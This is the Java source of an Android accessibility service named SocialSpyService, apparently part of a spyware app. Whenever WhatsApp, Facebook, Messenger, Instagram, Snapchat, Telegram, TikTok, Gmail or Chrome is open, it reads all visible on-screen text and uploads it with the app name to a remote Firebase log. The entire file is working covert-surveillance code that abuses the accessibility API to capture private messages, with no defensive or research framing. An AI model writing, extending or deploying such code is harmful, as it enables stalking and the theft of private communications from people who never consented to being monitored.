
package com.example.app;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.Arrays;
import java.util.List;

public class SocialSpyService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = String.valueOf(event.getPackageName());

        List<String> targets = Arrays.asList(
            "com.whatsapp", "com.facebook.katana", "com.facebook.orca",
            "com.instagram.android", "com.snapchat.android", "org.telegram.messenger",
            "com.zhiliaoapp.musically", "com.google.android.gm", "com.android.chrome"
        );

        if (targets.contains(packageName)) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String dump = extractText(root);
                FirebaseClient.pushLog(getApplicationContext(), "accessibility", packageName + " | " + dump);
            }
        }
    }

    private String extractText(AccessibilityNodeInfo node) {
        if (node == null) return "";
        StringBuilder sb = new StringBuilder();
        if (node.getText() != null) sb.append(node.getText()).append("\n");
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                sb.append(extractText(child));
            }
        }
        return sb.toString();
    }

    @Override
    public void onInterrupt() {}
}
